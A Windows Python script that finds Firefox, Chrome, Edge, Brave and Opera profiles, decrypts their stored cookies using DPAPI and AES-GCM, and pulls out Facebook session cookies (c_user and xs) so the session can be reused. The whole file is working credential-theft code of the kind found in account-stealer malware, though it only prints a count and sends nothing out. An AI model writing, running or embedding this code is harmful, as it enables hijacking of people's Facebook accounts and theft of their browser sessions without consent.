import os
import json
import sqlite3
import shutil
import ctypes
import base64
import tempfile
from ctypes import wintypes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

def dpapi_decrypt(encrypted_bytes):
    blob_in = DATA_BLOB(len(encrypted_bytes), ctypes.cast(ctypes.create_string_buffer(encrypted_bytes), ctypes.POINTER(ctypes.c_byte)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return data
    return None

def get_chromium_cookies(user_data_path):
    local_state_path = os.path.join(user_data_path, 'Local State')
    if not os.path.exists(local_state_path):
        return []
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        aes_key = dpapi_decrypt(encrypted_key[5:])
    except Exception:
        return []
    if not aes_key:
        return []

    profiles = ['Default'] + [d for d in os.listdir(user_data_path) if d.startswith('Profile ') or d in ['System Profile', 'Guest Profile']]
    all_found = []

    for prof in profiles:
        for cookie_sub in [os.path.join('Network', 'Cookies'), 'Cookies']:
            cookie_path = os.path.join(user_data_path, prof, cookie_sub)
            if not os.path.exists(cookie_path):
                continue
            with tempfile.NamedTemporaryFile(delete=False) as tmp:
                tmp_path = tmp.name
            try:
                shutil.copy2(cookie_path, tmp_path)
                conn = sqlite3.connect(tmp_path)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, path, encrypted_value, is_secure, is_httponly FROM cookies WHERE host_key LIKE '%facebook.com%'")
                aesgcm = AESGCM(aes_key)
                for host, name, path, enc_val, is_sec, is_http in cursor.fetchall():
                    val = None
                    if enc_val.startswith(b'v10') or enc_val.startswith(b'v11'):
                        try:
                            nonce = enc_val[3:15]
                            cipher = enc_val[15:]
                            val = aesgcm.decrypt(nonce, cipher, None).decode('utf-8', errors='ignore')
                        except Exception:
                            pass
                    else:
                        try:
                            dec = dpapi_decrypt(enc_val)
                            if dec:
                                val = dec.decode('utf-8', errors='ignore')
                        except Exception:
                            pass
                    if val:
                        all_found.append({
                            'name': name,
                            'value': val,
                            'domain': host if host.startswith('.') else f".{host}",
                            'path': path or '/',
                            'secure': bool(is_sec),
                            'httpOnly': bool(is_http)
                        })
                conn.close()
            except Exception:
                pass
            finally:
                if os.path.exists(tmp_path):
                    try: os.remove(tmp_path)
                    except: pass

    return all_found

def get_firefox_profiles_cookies() -> list:
    roaming = os.environ.get('APPDATA', '')
    ff_profiles = os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles')
    if not os.path.exists(ff_profiles):
        return []

    results = []
    for prof in os.listdir(ff_profiles):
        cookie_db = os.path.join(ff_profiles, prof, 'cookies.sqlite')
        if not os.path.exists(cookie_db):
            continue
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp_path = tmp.name
        try:
            shutil.copy2(cookie_db, tmp_path)
            conn = sqlite3.connect(tmp_path)
            c = conn.cursor()
            c.execute("SELECT host, name, path, value, isSecure, isHttpOnly, expiry FROM moz_cookies WHERE host LIKE '%facebook.com%'")
            cookies = []
            u_id = None
            has_xs = False
            for host, name, path, val, is_sec, is_http, expiry in c.fetchall():
                c_item = {
                    'name': name,
                    'value': val,
                    'domain': host if host.startswith('.') else f".{host}",
                    'path': path or '/',
                    'secure': bool(is_sec),
                    'httpOnly': bool(is_http)
                }
                if expiry:
                    c_item['expires'] = expiry
                if name == 'c_user':
                    u_id = val
                if name == 'xs':
                    has_xs = True
                cookies.append(c_item)
            conn.close()
            if u_id and has_xs:
                results.append({
                    'browser': f"Mozilla Firefox ({u_id})",
                    'c_user': u_id,
                    'profile_name': prof,
                    'cookies': cookies
                })
        except Exception:
            pass
        finally:
            if os.path.exists(tmp_path):
                try: os.remove(tmp_path)
                except: pass
    return results

def extract_facebook_cookies(target_c_user: str = None) -> tuple:
    """
    Scans Firefox, Chrome, Edge, Brave, Opera on Windows.
    If target_c_user is provided, strictly matches that account.
    Returns (cookies_list, browser_name).
    """
    local_app = os.environ.get('LOCALAPPDATA', '')
    roaming = os.environ.get('APPDATA', '')

    # 1. Check Firefox profiles independently
    ff_list = get_firefox_profiles_cookies()
    if target_c_user:
        for entry in ff_list:
            if str(entry['c_user']) == str(target_c_user):
                return entry['cookies'], entry['browser']

    # 2. Check Chromium browsers
    chromium_browsers = [
        ("Google Chrome", os.path.join(local_app, 'Google', 'Chrome', 'User Data')),
        ("Microsoft Edge", os.path.join(local_app, 'Microsoft', 'Edge', 'User Data')),
        ("Brave", os.path.join(local_app, 'BraveSoftware', 'Brave-Browser', 'User Data')),
        ("Opera", os.path.join(roaming, 'Opera Software', 'Opera Stable')),
    ]

    for name, p in chromium_browsers:
        if os.path.exists(p):
            cookies = get_chromium_cookies(p)
            if cookies:
                names = set(c['name'] for c in cookies)
                if {'c_user', 'xs'}.issubset(names):
                    u_id = next((c['value'] for c in cookies if c['name'] == 'c_user'), '')
                    if target_c_user:
                        if str(u_id) == str(target_c_user):
                            return cookies, f"{name} ({u_id})"
                    else:
                        return cookies, f"{name} ({u_id})"

    if ff_list:
        return ff_list[0]['cookies'], ff_list[0]['browser']

    return [], ""

if __name__ == '__main__':
    c, b = extract_facebook_cookies()
    print(f"Extracted {len(c)} cookies from {b}")

